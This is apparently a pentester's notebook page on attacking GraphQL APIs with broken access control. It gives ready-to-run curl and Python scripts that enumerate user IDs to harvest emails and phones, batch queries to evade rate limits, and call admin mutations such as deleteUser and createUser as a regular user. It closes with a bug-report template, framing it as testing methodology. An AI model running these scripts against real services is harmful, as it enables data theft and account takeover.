---
tags: [bac, attack, graphql, bola, bfla, introspection]
type: attack
severity: high
date: 2026-03-10
---

# 🔍 GraphQL BAC — Exploitation Techniques

> Theory is in [[API-BAC]]. This file is pure technique: step-by-step exploitation for every GraphQL BAC class. Use [[InQL]] in Burp as your primary tool.

---

## Step 0: Confirm GraphQL Exists

```bash
# Common endpoint locations:
for path in graphql graphiql api/graphql v1/graphql query graph gql; do
  code=$(curl -sk -o/dev/null -w "%{http_code}" "https://TARGET/$path" \
         -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}')
  [[ "$code" == "200" ]] && echo "[FOUND] /$path → $code"
done
```

---

## Step 1: Run Introspection

Introspection maps the entire schema — types, fields, queries, mutations, subscriptions.

```bash
# Full introspection query:
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"
  }' | python3 -m json.tool | tee schema.json

# If blocked with "introspection disabled":
# Try field-level introspection (often still works):
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}' \
  -H "Authorization: Bearer TOKEN"

# Try via GET (some servers allow introspection on GET only):
curl -sk "https://TARGET/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Clairvoyance — blind introspection via field guessing:
python3 clairvoyance.py -u https://TARGET/graphql \
  -H "Authorization: Bearer TOKEN" \
  -o schema.json
```

**In Burp with InQL**: InQL tab → enter endpoint → "Analyze" → full schema tree auto-populated.

---

## Step 2: Map the Schema for BAC Targets

From the introspection result, look for:

```
Queries to test for BOLA (object-level auth):
  user(id: ...)           → GET another user's data
  order(id: ...)          → GET another user's order
  document(id: ...)       → GET another user's document
  invoice(id: ...)        → GET another user's invoice
  message(id: ...)        → GET another user's message
  account(id: ...)        → GET another user's account
  file(id: ...)           → GET another user's file

Mutations to test for BFLA (function-level auth):
  deleteUser(id: ...)     → should require admin
  updateUserRole(...)     → should require admin
  banUser(id: ...)        → should require admin
  createAdmin(...)        → should require admin
  broadcastMessage(...)   → should require admin
  exportAllUsers(...)     → should require admin
  impersonateUser(...)    → should require admin

Fields to test for over-exposure:
  passwordHash, password
  apiKey, secretKey, privateKey
  ssn, dateOfBirth, taxId
  creditCardNumber, cvv, bankAccount
  resetToken, verificationToken
  internalNote, adminComment
```

---

## Step 3: BOLA — Object-Level Authorization Test

For every query that accepts an ID, test cross-account access:

```graphql
# Your own resource (baseline):
query {
  order(id: "MY_ORDER_ID") {
    id total status items { name price }
  }
}

# Cross-account access (BOLA):
query {
  order(id: "VICTIM_ORDER_ID") {
    id total status items { name price }
    user { id email phone address }
  }
}
```

```bash
# Script: test a range of integer IDs
for id in $(seq 1 200); do
  result=$(curl -sk -X POST https://TARGET/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer MY_TOKEN" \
    -d "{\"query\":\"{ user(id: \\\"$id\\\") { id email name phone } }\"}")
  email=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('data',{}).get('user',{}).get('email',''))" 2>/dev/null)
  [[ -n "$email" ]] && echo "[BOLA] id=$id email=$email"
done
```

---

## Step 4: BFLA — Function-Level Authorization Test

For every mutation that sounds privileged, call it as a regular user:

```graphql
# Should require admin — test as regular user:
mutation {
  deleteUser(id: "9999") {
    success
  }
}

mutation {
  updateUserRole(userId: "9999", role: ADMIN) {
    id role
  }
}

mutation {
  createUser(
    email: "newadmin@test.com"
    password: "Pass123!"
    role: ADMIN
  ) {
    id email role
  }
}
```

**What to look for**: If the mutation returns `{ "data": { "deleteUser": { "success": true } } }` as a regular user → BFLA confirmed.

---

## Step 5: Field-Level Authorization Test

Even if you can access an object, some fields should be restricted:

```graphql
# Test sensitive fields on your own object first (baseline):
query {
  user(id: "MY_ID") {
    id email name
    passwordHash      # should be hidden
    apiKey            # should be hidden
    resetToken        # should be hidden
    internalNotes     # should be admin-only
    creditCard { number cvv }  # should be PCI-masked
  }
}

# If accessible on YOUR own record, test on OTHER users:
query {
  user(id: "VICTIM_ID") {
    passwordHash apiKey resetToken
  }
}
```

---

## Step 6: Batch Query Abuse (Rate-Limit Bypass)

```bash
# Build a batch of 100 BOLA queries in one HTTP request:
python3 - <<'EOF'
import json, requests

TOKEN = "Bearer YOUR_TOKEN"
TARGET = "https://target.com/graphql"

# Build batch
batch = [
    {"query": f'{{ user(id: "{i}") {{ id email name phone }} }}'}
    for i in range(1, 101)
]

r = requests.post(TARGET,
    headers={"Authorization": TOKEN, "Content-Type": "application/json"},
    json=batch)

for i, result in enumerate(r.json()):
    user = result.get("data", {}).get("user")
    if user:
        print(f"[BOLA] id={i+1} → {user}")
EOF
```

---

## Step 7: Subscription Authorization Test

```graphql
# Subscribe to another user's real-time events:
subscription {
  messageReceived(userId: "VICTIM_ID") {
    id content sender { id email } timestamp
  }
}

subscription {
  orderUpdated(customerId: "VICTIM_ID") {
    id status total
  }
}
```

Use `wscat` to test subscriptions (GraphQL over WebSocket):
```bash
# Install: npm install -g wscat
wscat -c "wss://target.com/graphql" \
  -H "Authorization: Bearer TOKEN" \
  -x '{"type":"connection_init","payload":{"Authorization":"Bearer TOKEN"}}'
# Then send subscription message after connection_ack
```

---

## Step 8: Introspection Bypass Techniques

When introspection is disabled, you can still enumerate the schema:

```graphql
# Technique 1: __type on specific type names (often allowed):
{ __type(name: "User") { fields { name type { name } } } }
{ __type(name: "Order") { fields { name type { name } } } }
{ __type(name: "Admin") { fields { name type { name } } } }

# Technique 2: Field suggestion errors
# GraphQL returns "Did you mean X?" suggestions when you typo a field name:
{ user(id:"1") { emal } }
# → "Cannot query field 'emal' on type 'User'. Did you mean 'email'?"
# → Reveals real field names!

# Technique 3: Clairvoyance — automatic blind enumeration
python3 clairvoyance.py -u https://TARGET/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
  -o schema.json
```

---

## Evidence Template for GraphQL BOLA Report

```
Bug: GraphQL BOLA — unauthorized access to another user's [resource]

Attacker Account: attacker@test.com (user ID: USR-001)
Victim Account:   victim@test.com  (user ID: USR-002)

Request (attacker's token, victim's resource):
  POST /graphql
  Authorization: Bearer [ATTACKER_JWT]
  {"query":"{ order(id: \"VICTIM_ORDER_ID\") { id total user { email } } }"}

Response:
  {"data":{"order":{"id":"VICTIM_ORDER_ID","total":299.00,
    "user":{"email":"victim@test.com"}}}}

Expected: 403 or null data for unauthorized resource
Actual:   Full order data including victim's email returned
```

---

## Tasks
- [ ] #task Confirm GraphQL endpoint exists and which paths respond
- [ ] #task Run full introspection — save schema to file
- [ ] #task Use InQL in Burp to auto-generate all queries
- [ ] #task Test BOLA: swap IDs in every object query
- [ ] #task Test BFLA: call all admin mutations as regular user
- [ ] #task Test field-level auth: request sensitive fields on your own + others' objects
- [ ] #task Test batch queries for rate-limit bypass
- [ ] #task Test subscription auth: subscribe to victim's event channel

---

## 🔗 Related Notes
- [[API-BAC]] — GraphQL theory and HTTP-level patterns
- [[IDOR-Techniques]] — general IDOR exploitation
- [[Burp-Suite-BAC]] — InQL setup and workflow
- [[Custom-Scripts]] — Script 6: GraphQL BOLA + introspection scanner
- [[Testing-Checklist]] — GraphQL test tasks in Phase 2

---
*Tags: #graphql #bola #bfla #bac #attack*
